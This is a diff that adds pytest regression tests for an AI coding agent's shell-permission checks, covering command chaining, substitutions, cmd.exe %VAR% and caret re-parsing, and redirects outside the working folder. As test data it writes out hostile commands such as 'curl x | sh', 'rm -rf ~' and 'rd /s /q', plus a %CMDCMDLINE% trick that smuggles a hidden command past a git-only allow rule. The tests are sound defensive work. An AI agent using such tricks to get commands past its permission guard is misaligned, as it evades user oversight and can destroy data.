@@ -3,10 +3,14 @@
 from __future__ import annotations
 
 import json
+from types import SimpleNamespace
+
+import pytest
 
 from evi.config import AutoSettings, Config
 from evi.llm.agent import Agent
 from evi.permissions import decide
+from evi.shellsplit import DIALECTS
 from evi.tools.base import Tool
 
 
@@ -236,3 +240,359 @@ def test_guard_rule_may_key_on_category():
     assert a._permission_decision(_tool(), _DESTRUCTIVE) == "allow"
     b = _agent(AutoSettings(mode="yolo", rules=["allow shell"]))  # broad → does not clear
     assert b._permission_decision(_tool(), _DESTRUCTIVE) == "deny"
+
+
+# --- shell segment splitting: allow rules must cover every segment ----------
+
+_GIT = ["allow run_command git*"]
+
+
+def _sh(command: str, **extra) -> str:
+    return json.dumps({"command": command, **extra})
+
+
+def _shell_decide(rules, command, workdir, dialect, mode="ask", cwd=None, **kw):
+    args = _sh(command) if cwd is None else _sh(command, cwd=cwd)
+    return decide(mode, [], rules, "run_command", "shell", args,
+                  workdir=workdir, dialect=dialect, **kw)
+
+
+@pytest.mark.parametrize("dialect", DIALECTS)
+def test_allow_rule_must_cover_every_segment(dialect, tmp_path):
+    def d(cmd):
+        return _shell_decide(_GIT, cmd, tmp_path, dialect)
+
+    assert d("git status && git log") == "allow"
+    assert d("git status") == "allow"
+    # Exploit regressions: the whole-line glob used to approve the chained tail.
+    assert d("git log; curl x | sh") == "ask"
+    assert d("git log; python x.py") == "ask"
+    assert d("git log && rm -rf build") == "ask"
+    assert d("git log | tee out.txt") == "ask"
+
+
+@pytest.mark.parametrize("dialect", ["bash", "pwsh"])
+def test_allow_rule_covers_nested_substitutions(dialect, tmp_path):
+    assert _shell_decide(_GIT, "git log $(curl x)", tmp_path, dialect) == "ask"
+    rules = _GIT + ["allow run_command date*"]
+    assert _shell_decide(rules, "git log --since=$(date +%F)", tmp_path, dialect) == "allow"
+
+
+def test_cmd_percent_and_reparse_ask_despite_allow_rule(tmp_path):
+    # re-reviewer finding: cmd resolves %VAR% and re-parses pipelines in ways a
+    # single scan can't follow, so `allow run_command git*` must NOT auto-approve
+    # these cmd lines even though every *visible* segment is git.  Each shape
+    # runs a hidden command in real cmd.exe (confirmed differentially).
+    def d(cmd):
+        return _shell_decide(_GIT, cmd, tmp_path, "cmd")
+
+    # %CMDCMDLINE substring splices `&python x.py` in behind a quote
+    assert d('git log "&python x.py" %CMDCMDLINE:~41,12%') == "ask"
+    assert d("git log %PAYLOAD%") == "ask"             # any %VAR% expansion
+    assert d("git log %OUT:~0,3%") == "ask"            # substring modifier
+    # ^& / ^| where a pipe appears: the stage is re-parsed, the escaped sep runs
+    assert d("git log ^& rd x | git status") == "ask"
+    assert d("git log ^| rd x | git status") == "ask"
+    assert d("(git log ^& rd x) | git status") == "ask"
+    assert d("for /f %i in ('git log') do git show %i") == "ask"  # for /f command set
+    # a caret-escaped separator with NO pipe is one covered command → still allow
+    assert d("git log ^& git status") == "allow"
+
+
+@pytest.mark.parametrize("dialect", DIALECTS)
+def test_rules_together_cover_the_segments(dialect, tmp_path):
+    rules = ["allow run_command git*", "allow run_command python*"]
+    assert _shell_decide(rules, "git log; python x.py", tmp_path, dialect) == "allow"
+
+
+@pytest.mark.parametrize("dialect", DIALECTS)
+def test_unparsable_line_asks_despite_allow_rule(dialect, tmp_path):
+    rules = ["allow run_command bash*", "allow run_command git*", "allow run_command cmd*",
+             "allow run_command powershell*"]
+    assert _shell_decide(rules, "bash script.sh", tmp_path, dialect) == "allow"
+    assert _shell_decide(rules, 'bash -c "echo hi"', tmp_path, dialect) == "ask"
+    assert _shell_decide(rules, "bash -lc 'git log'", tmp_path, dialect) == "ask"
+    assert _shell_decide(rules, 'git log "unbalanced', tmp_path, dialect) == "ask"
+    assert _shell_decide(rules, "cmd /c git log", tmp_path, dialect) == "ask"
+    assert _shell_decide(rules, "powershell -Command git log", tmp_path, dialect) == "ask"
+
+
+@pytest.mark.parametrize("dialect", ["bash", "pwsh"])
+def test_unbalanced_single_quote_asks(dialect, tmp_path):
+    rules = ["allow run_command echo*"]
+    assert _shell_decide(rules, "echo 'balanced'", tmp_path, dialect) == "allow"
+    assert _shell_decide(rules, "echo 'unbalanced", tmp_path, dialect) == "ask"
+
+
+@pytest.mark.parametrize("dialect", DIALECTS)
+def test_broad_allow_still_covers_any_line(dialect, tmp_path):
+    # `allow run_command` / `allow run_command *` is the user allowing every
+    # command: unparsable lines and outside redirects included (as before).
+    for rules in (["allow run_command"], ["allow run_command *"]):
+        assert _shell_decide(rules, 'bash -c "x"', tmp_path, dialect) == "allow"
+        assert _shell_decide(rules, "git log; rm -rf build", tmp_path, dialect) == "allow"
+
+
+@pytest.mark.parametrize("dialect", DIALECTS)
+def test_redirect_outside_workdir_asks(dialect, tmp_path):
+    work = tmp_path / "proj"
+    work.mkdir()
+    outside = tmp_path / "elsewhere.txt"
+    var = {"bash": "$OUT", "pwsh": "$env:OUT", "cmd": "%OUT%"}[dialect]
+    null = {"bash": "/dev/null", "pwsh": "$null", "cmd": "nul"}[dialect]
+
+    def d(cmd, **kw):
+        return _shell_decide(_GIT, cmd, work, dialect, **kw)
+
+    assert d("git log > log.txt") == "allow"
+    assert d("git log >> sub/log.txt 2>&1") == "allow"
+    assert d(f"git log 2> {null}") == "allow"
+    assert d(f'git log > "{outside}"') == "ask"
+    assert d("git log > ../elsewhere.txt") == "ask"
+    assert d("git log > ~/x.txt") == "ask"
+    assert d(f"git log > {var}") == "ask"  # unknown path
+    # relative targets resolve against the call's cwd
+    assert d("git log > log.txt", cwd=str(tmp_path)) == "ask"
+    assert d("git log > log.txt", cwd="sub") == "allow"
+
+
+@pytest.mark.parametrize("dialect", DIALECTS)
+def test_redirect_after_cd_asks(dialect, tmp_path):
+    rules = _GIT + ["allow run_command cd*"]
+    assert _shell_decide(rules, "cd sub && git log", tmp_path, dialect) == "allow"
+    assert _shell_decide(rules, "cd .. && git log > log.txt", tmp_path, dialect) == "ask"
+
+
+def test_redirect_symlink_out_of_workdir_asks(tmp_path):
+    work = tmp_path / "proj"
+    work.mkdir()
+    (tmp_path / "target").mkdir()
+    try:
+        (work / "link").symlink_to(tmp_path / "target", target_is_directory=True)
+    except (OSError, NotImplementedError):
+        pytest.skip("symlinks not available")
+    assert _shell_decide(_GIT, "git log > link/x.txt", work, "bash") == "ask"
+
+
+@pytest.mark.parametrize("dialect", DIALECTS)
+def test_deny_rule_matches_any_segment(dialect, tmp_path):
+    rules = ["deny run_command rm*", "allow run_command *"]
+    assert _shell_decide(rules, "ls && rm -rf build", tmp_path, dialect) == "deny"
+    assert _shell_decide(rules, "ls && echo hi", tmp_path, dialect) == "allow"
+    # ...even when the line is unparsable after the denied segment
+    assert _shell_decide(rules, 'rm -rf build && bash -c "x"', tmp_path, dialect) == "deny"
+
+
+@pytest.mark.parametrize("dialect", DIALECTS)
+def test_hard_deny_matches_any_segment(dialect, tmp_path):
+    hd = ["run_command rm -rf*"]
+    assert _shell_decide([], "ls && rm -rf /tmp/x", tmp_path, dialect,
+                         mode="yolo", hard_deny=hd) == "deny"
+    assert _shell_decide([], "ls && echo rm -rf", tmp_path, dialect,
+                         mode="yolo", hard_deny=hd) == "allow"
+
+
+def test_monitor_command_is_split_too(tmp_path):
+    rules = ["allow monitor git*"]
+
+    def d(args):
+        return decide("ask", [], rules, "monitor", "code", json.dumps(args),
+                      workdir=tmp_path, dialect="bash")
+
+    assert d({"target": "git log", "kind": "command"}) == "allow"
+    assert d({"target": "git log; rm x", "kind": "command"}) == "ask"
+    # tailing a file is not a shell command: the glob matches the path as before
+    assert d({"target": "git.log", "kind": "file"}) == "allow"
+
+
+def test_non_shell_tools_keep_whole_argument_matching():
+    assert decide("ask", [], ["allow write_file *; x"], "write_file", "fs",
+                  '{"path": "a; x"}') == "allow"
+
+
+@pytest.mark.parametrize("dialect", DIALECTS)
+def test_allow_rule_on_cwd_argument_no_longer_approves_shell_lines(dialect, tmp_path):
+    # Intended change (review round 1): for a shell call an allow rule's
+    # arg-glob must cover the command segments. A glob that only matches the
+    # `cwd` argument used to approve ANY line run there, chains included.
+    rules = [f"allow run_command {tmp_path}*"]
+    for cmd in ("npm test", "git log; rm -rf build"):
+        assert _shell_decide(rules, cmd, tmp_path, dialect, cwd=str(tmp_path)) == "ask"
+    # ...while a deny rule still matches any string argument, cwd included.
+    deny = [f"deny run_command {tmp_path}*", "allow run_command *"]
+    assert _shell_decide(deny, "npm test", tmp_path, dialect, cwd=str(tmp_path)) == "deny"
+
+
+def _monitor_args(target: str) -> str:
+    return json.dumps({"target": target, "kind": "command"})
+
+
+@pytest.mark.parametrize("dialect", DIALECTS)
+def test_monitor_redirect_resolves_against_the_process_cwd(dialect, tmp_path, monkeypatch):
+    # monitor's Popen passes no cwd=, so `> log.txt` lands in the eVi process
+    # cwd, not the session working folder: judge the redirect where it lands.
+    work = tmp_path / "proj"
+    work.mkdir()
+    other = tmp_path / "other"
+    other.mkdir()
+
+    def d():
+        return decide("ask", [], ["allow monitor echo*"], "monitor", "code",
+                      _monitor_args("echo hi > log.txt"), workdir=work, dialect=dialect)
+
+    monkeypatch.chdir(other)
+    assert d() == "ask"
+    monkeypatch.chdir(work)
+    assert d() == "allow"
+
+
+def test_guard_monitor_redirect_resolves_against_the_process_cwd(tmp_path, monkeypatch):
+    work = tmp_path / "proj"
+    work.mkdir()
+    other = tmp_path / "other"
+    other.mkdir()
+    a = _agent(AutoSettings(mode="yolo", rules=["allow monitor git*"]))
+    a.cwd = str(work)
+    mon = _tool(name="monitor", category="code")
+    args = _monitor_args("git push --force origin main > push.log")
+    monkeypatch.chdir(other)
+    assert a._permission_decision(mon, args) == "deny"  # headless: guard holds
+    monkeypatch.chdir(work)
+    assert a._permission_decision(mon, args) == "allow"
+
+
+def test_guard_and_rules_share_one_shell_tool_map(tmp_path, monkeypatch):
+    # A new shell-running tool registered in permissions.SHELL_EXEC_TOOLS is
+    # guarded AND segment-matched; neither path can fall back to treating its
+    # command line as an opaque string.
+    import evi.permissions as permissions
+
+    monkeypatch.setitem(permissions.SHELL_EXEC_TOOLS, "run_script", "line")
+    tool = _tool(name="run_script", category="code")
+    a = _agent(AutoSettings(mode="yolo"))
+    a.cwd = str(tmp_path)
+    assert a._permission_decision(tool, json.dumps({"line": "rm -rf ~"})) == "deny"
+    assert a._permission_decision(tool, json.dumps({"line": "ls"})) == "allow"
+    b = _agent(AutoSettings(mode="ask", rules=["allow run_script git*"], auto_approve=[]))
+    b.cwd = str(tmp_path)
+    assert b._permission_decision(tool, json.dumps({"line": "git log"})) == "allow"
+    assert b._permission_decision(tool, json.dumps({"line": "git log; python x.py"})) == "ask"
+
+
+# --- the destructive guard: an allow rule clears it only segment by segment ---
+
+
+def test_guard_allow_rule_must_cover_every_segment(tmp_path):
+    # Exploit regression (verifier finding): `allow run_command git*` cleared
+    # the guard for `git log; rm -rf ~`, and decide() then auto-approved it.
+    run = _tool(name="run_command")
+    a = _agent(AutoSettings(mode="ask", rules=list(_GIT)))
+    a.cwd = str(tmp_path)
+    assert a._permission_decision(run, _sh("git log; rm -rf ~")) == "deny"  # headless
+    assert a._ask_permission(run, _sh("git log; rm -rf ~")) is False
+    assert a._permission_decision(run, _sh("git status && git log")) == "allow"
+    ui = _agent_cb(AutoSettings(mode="ask", rules=list(_GIT)), lambda n, args, cat: False)
+    ui.cwd = str(tmp_path)
+    assert ui._permission_decision(run, _sh("git log; rm -rf ~")) == "ask"
+
+
+def test_guard_category_rule_must_cover_every_segment(tmp_path):
+    a = _agent(AutoSettings(mode="yolo", rules=["allow shell git*"]))
+    a.cwd = str(tmp_path)
+    run = _tool(name="run_command")
+    assert a._permission_decision(run, _sh("git log; rm -rf ~")) == "deny"
+    assert a._permission_decision(run, _sh("git push --force origin main")) == "allow"
+
+
+def test_guard_not_cleared_for_unparsable_or_outside_redirect(tmp_path):
+    work = tmp_path / "proj"
+    work.mkdir()
+    run = _tool(name="run_command")
+    a = _agent(AutoSettings(mode="ask", rules=["allow run_command bash*",
+                                                "allow run_command git*"]))
+    a.cwd = str(work)
+    assert a._permission_decision(run, _sh('bash -c "rm -rf ~"')) == "deny"
+    assert a._permission_decision(run, _sh('git push --force origin main "oops')) == "deny"
+    outside = tmp_path / "push.log"
+    assert a._permission_decision(
+        run, _sh(f'git push --force origin main > "{outside}"')) == "deny"
+    assert a._permission_decision(run, _sh("git push --force origin main > push.log")) == "allow"
+
+
+def test_guard_deny_rule_matches_a_segment(tmp_path):
+    a = _agent_cb(AutoSettings(mode="yolo", rules=["deny run_command rm*"]),
+                  lambda n, args, cat: True)
+    a.cwd = str(tmp_path)
+    assert a._permission_decision(_tool(name="run_command"), _sh("ls; rm -rf ~")) == "deny"
+
+
+def test_guard_not_cleared_for_cmd_percent_or_reparse(tmp_path, monkeypatch):
+    # re-reviewer finding, guard path: on Windows the guard splits with the cmd
+    # dialect (shellsplit.default_dialect()); force it so this runs everywhere.
+    # `allow run_command git*` must NOT clear the destructive guard for a cmd
+    # line that hides a destructive command behind %VAR% or a caret re-parse,
+    # and destructive_allow globs can't exempt one either.
+    import evi.shellsplit as ss
+    monkeypatch.setattr(ss, "default_dialect", lambda: "cmd")
+    run = _tool(name="run_command")
+
+    a = _agent(AutoSettings(mode="ask", rules=list(_GIT)))  # headless (no UI)
+    a.cwd = str(tmp_path)
+    pct = 'git log "&rd /s /q C:\\\\x" %CMDCMDLINE:~41,12%'
+    assert a._permission_decision(run, _sh(pct)) == "deny"
+    reparse = "git log ^& rd /s /q C:\\x | git status"
+    assert a._permission_decision(run, _sh(reparse)) == "deny"
+
+    b = _agent(AutoSettings(mode="yolo",
+                            destructive_allow=["git push --force-with-lease*"]))
+    b.cwd = str(tmp_path)
+    exempt = 'git push --force-with-lease "&rd /s /q C:\\\\x" %CMDCMDLINE:~61,12%'
+    assert b._permission_decision(run, _sh(exempt)) == "deny"
+
+
+# --- the same through Agent.chat (scripted fake LLM stream) ------------------
+
+
+def _tool_call_turn(call_id: str, name: str, args: str) -> list:
+    fn = SimpleNamespace(name=name, arguments=args)
+    delta = SimpleNamespace(content=None, tool_calls=[
+        SimpleNamespace(index=0, id=call_id, function=fn)])
+    return [SimpleNamespace(choices=[SimpleNamespace(delta=delta, finish_reason="tool_calls")])]
+
+
+def _text_turn(text: str) -> list:
+    delta = SimpleNamespace(content=text, tool_calls=None)
+    return [SimpleNamespace(choices=[SimpleNamespace(delta=delta, finish_reason="stop")])]
+
+
+def _scripted_client(turns: list[list]) -> SimpleNamespace:
+    it = iter(turns)
+    completions = SimpleNamespace(create=lambda **_: iter(next(it)))
+    return SimpleNamespace(chat=SimpleNamespace(completions=completions))
+
+
+@pytest.mark.parametrize("command,prompted,ran", [
+    ("git status && git log", False, True),  # every segment covered: no prompt
+    ("git log; python x.py", True, False),  # uncovered tail: ask (user says no)
+    ("git log; rm -rf ~", True, False),  # destructive tail: the guard holds
+])
+def test_chat_allow_rule_covers_every_segment(tmp_path, command, prompted, ran):
+    ran_cmds: list[str] = []
+    prompts: list[str] = []
+    run_command = Tool(
+        name="run_command", description="",
+        parameters={"type": "object", "properties": {"command": {"type": "string"}}},
+        func=lambda command: ran_cmds.append(command) or "exit 0", category="shell",
+    )
+    cfg = Config()
+    cfg.auto = AutoSettings(mode="ask", rules=list(_GIT))
+    agent = Agent(
+        client=_scripted_client([_tool_call_turn("c1", "run_command", _sh(command)),
+                                 _text_turn("done")]),
+        config=cfg, tools=[run_command],
+        permission_callback=lambda name, args, cat: prompts.append(args) or False,
+    )
+    agent.cwd = str(tmp_path)
+    list(agent.chat("go"))
+    assert bool(prompts) is prompted
+    assert (ran_cmds == [command]) is ran
